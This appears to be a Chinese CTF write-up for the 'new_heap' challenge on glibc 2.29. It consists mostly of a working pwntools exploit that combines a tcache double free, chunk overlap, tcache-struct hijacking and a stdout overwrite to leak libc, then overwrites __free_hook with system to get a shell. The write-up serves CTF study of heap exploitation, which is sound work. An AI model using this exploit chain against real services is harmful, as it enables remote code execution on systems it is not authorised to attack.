# new_heap

## 题目简述

题目是 glibc 2.29 下的 tcache/double free 堆题，思路类似魔改版 heap paradise。2.29 新增 tcache double free 检查，且题目限制 malloc 次数，不能直接套旧版 tcache poisoning。程序的 `stdin` 没有 `setbuf`，`getchar` 会触发一次 0x1000 chunk 分配，可借此触发 `malloc_consolidate`，再通过 chunk 重叠、tcache struct 劫持和 stdout 泄露拿到 libc，最后改 `__free_hook` 为 `system`。

## 解题过程

算是魔改pwnable.tw的heap *paradise，由于stdin没有setbuf所以getchar的时候会malloc一个0x1000的chunk，可以用来触发malloc\_consolidate。另外2.29下tcache新增了double free检查，因为限制了malloc次数，所以构造上还是有一些繁琐的，具体的看exp把没啥特别的新东西* (:з」∠)\_

```python
#coding=utf8
from pwn import *
# context.log_level = 'debug'
context.terminal = ['gnome-terminal','-x','bash','-c']

local = 0
binary_name = 'new_heap'

ru = lambda x : cn.recvuntil(x)
sn = lambda x : cn.send(x)
rl = lambda   : cn.recvline()
sl = lambda x : cn.sendline(x)
rv = lambda x : cn.recv(x)
sa = lambda a,b : cn.sendafter(a,b)
sla = lambda a,b : cn.sendlineafter(a,b)

bin = ELF('./'+binary_name,checksec=False)

def z(a=''):
    if local:
        gdb.attach(cn,a)
        if a == '':
            raw_input()
    else:
        pass

def add(sz,con):
    sla('3.','1')
    sla('size',str(sz))
    sa('content',con)

def dele(idx):
    sla('3.','2')
    sla('index',str(idx))

libc = ELF('/usr/glibc-2.29/lib/libc.so.6',checksec=False)
times = 0
while True:
    try:
        times += 1
        if local:
            cn = process('./'+binary_name)
            #libc = ELF('/lib/i386-linux-gnu/libc-2.23.so',checksec=False)
        else:
            cn = remote('0',20001)
            #libc = ELF('')

        ru('good present for African friends:')
        hi = int(rl()[:-1],16)
        success('hi:'+hex(hi))
        for i in range(9):
            add(0x58,'aaa')#0~#8 make two chunk in fastbin
        for i in range(8,-1,-1):
            dele(i)
        # z('c')
        sla('3.','3')
        sla('sure?','n')
        add(0x58,'aaa')#9 take a chunk from tcache
        dele(1)#put fast chunk into tcache,#1->fd is a heap address
        add(0x78,'b'*0x58+p64(0x41)+'\x10'+chr(hi-2))#10 overlap #1->fd and change its size
        add(0x78,'asdasd')#11 recover unsortedbin(put chunk to smallbin)
        add(0x58,'a'*0x10+p64(0)+p64(0x21)+'\x60\x17')#12 realloc #1 and overlap smallbin chunk->fd(which point to arena) to stdout,and next free chunk point to tcache address
        dele(1)# make 0x40 tcache not null
        buf = p64(0x0000000000020000)+p64(0)*3 + p64(0x7000000) + p64(0)*5
        buf+= '\xe0'+chr(hi)
        add(0x58,buf)#13 overlap tcache struct,hijack 0x40 tcache to the chunk which fd is stdout,and fill 0x250 tcache
        add(0x30,'/bin/shx00')#14
        buf = p64(0xfbad1800)+p64(0)*3+'\x00'
        add(0x38,buf)#15 overlap stdout,leak the libc address
        cn.recvuntil(':'+'\x00'*8,timeout=1)
        lbase = u64(rv(6).ljust(8,'\x00')) - libc.sym['_IO_stdfile_2_lock']
        success('lbase:'+hex(lbase))
        dele(13)#free tcache struct to unsorted bin
        buf = p64(0x0000000000000001)+p64(0)*7
        buf+= p64(lbase+libc.sym['__free_hook'])
        add(0x68,buf)#16
        add(0x18,p64(lbase+libc.sym['system']))#17
        dele(14)
        sl('echo shell '+str(times))
        ru('shell')
        cn.interactive()
        exit(0)
    except EOFError:
        cn.close()
```

## 方法总结

- 核心技巧：在 glibc 2.29 的 tcache double free 检查下，通过触发 `malloc_consolidate` 和 chunk overlap 绕过限制，再劫持 tcache struct 指向 stdout 完成 libc leak。
- 识别信号：glibc 2.29、malloc 次数受限、stdin 未关闭缓冲导致额外大 chunk 分配时，应考虑利用 IO 触发的堆行为改变 bin 状态。
- 复用要点：2.29 tcache 利用要同时关注 key 检查、tcache count 和 unsorted/smallbin 过渡；泄露阶段可覆盖 stdout 的 `_flags`，写阶段再把 tcache 链指向 `__free_hook`。

